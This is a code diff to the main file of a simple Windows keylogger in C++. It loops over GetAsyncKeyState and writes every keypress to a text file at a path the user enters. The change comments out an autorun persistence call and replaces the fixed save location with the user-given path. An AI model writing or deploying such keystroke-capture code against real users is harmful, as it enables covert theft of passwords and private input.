@@ -1,5 +1,5 @@
 #include "basic_functions.h"
-
+#include "windows_os.h"
 /*******************************************************************/
 
 /* Date: 10.06.2018                                                */
@@ -18,14 +18,17 @@ int main()
 	setlocale(LC_ALL, "ru");
 
 	char key;
-
+	std::string path;
 	K_Logger keyLog;
+	//keyLog.AddToAutorun();
 
-	keyLog.AddToAutorun();
-	
-	cout << "File is saved to disk D\nWait..." << endl;
-	Sleep(1000);
+	cout << "Write path for the file with data: " << endl;
+	cin >> path;
+	path += ".txt";
 	system("cls");
+	cout << "File is saved to " << path << "\nWait..." << endl;
+	Sleep(1000);
+    system("cls");
 
 	while (true)
 	{
@@ -34,7 +37,7 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
 			{
-				keyLog.SaveSymbol(key);
+				keyLog.SaveSymbol(key, path);
 			}
 		}
 	}
